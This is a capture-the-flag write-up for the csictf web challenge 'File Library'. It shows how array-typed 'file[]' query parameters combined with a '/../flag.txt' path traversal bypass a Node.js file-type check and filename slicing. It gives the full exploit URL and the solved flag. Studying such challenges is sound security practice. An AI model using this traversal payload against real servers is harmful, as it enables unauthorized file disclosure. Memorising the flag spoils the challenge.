---
layout: post
title: "File Library"
author: "shreyas-sriram"
tags: ['Web']
---

This is my file library. I don't have a lot of files, but I hope you like the ones I have!

[http://chall.csivit.com:30222]([http://chall.csivit.com:30222])

## Files
* [server.js]({{site.baseurl}}/assets/File-Library/server.js)

## Solution
* There is a lot of mention about *files* in the challenge
* Opening the available files leads us to this page<br/>
[http://chall.csivit.com:30222/getFile?file=ok.js](http://chall.csivit.com:30222/getFile?file=ok.js)
* Attempt to get the flag by [http://chall.csivit.com:30222/getFile?file=flag.txt](http://chall.csivit.com:30222/getFile?file=flag.txt) results in `File type not allowed`
* Going through the source code, we can see that there is a check for the supported file-type and the filename is sliced at index 5 before fetching the file<br/>

**File-type check**
```javscript
if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') {
        return true;
    }

    return false;
```

**Filename slicing**
```javscript
if (file.length > 5) {
        file = file.slice(0, 5);
    }
```

* Notice that the file-type check happens before slicing the filename
* Reading up on the methods `slice()` and `indexOf()`, we learn that they accept `list` as arguments too
* The flag is obtained by crafting a clever payload to bypass all the checks<br/>

**Payload**
```
/getFile?file[]=f&file[]=4&file[]=k&file[]=e&file[]=/../flag.txt&file[]=.&file[]=js
```

**Payload Explanation**<br/>
* As seen above, it has 7 `GET` parameters as `flag[]`, this is parsed by the server as a `list / array`<br/>

```javascript
file[] = ["f","4","k","e","/../flag.txt",".","js"]
```

* File-type check parses only `["js"]` and is bypassed
* Filename slicing parses only `file[] = ["f","4","k","e","/../flag.txt"]`
* This successfully read `flag.txt`


**Flag URL**<br/>
[http://chall.csivit.com:30222/getFile?file[]=f&file[]=l&file[]=a&file[]=g&file[]=/../flag.txt&file[]=.&file[]=js](http://chall.csivit.com:30222/getFile?file[]=f&file[]=l&file[]=a&file[]=g&file[]=/../flag.txt&file[]=.&file[]=js)

## Flag
```
csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}
```
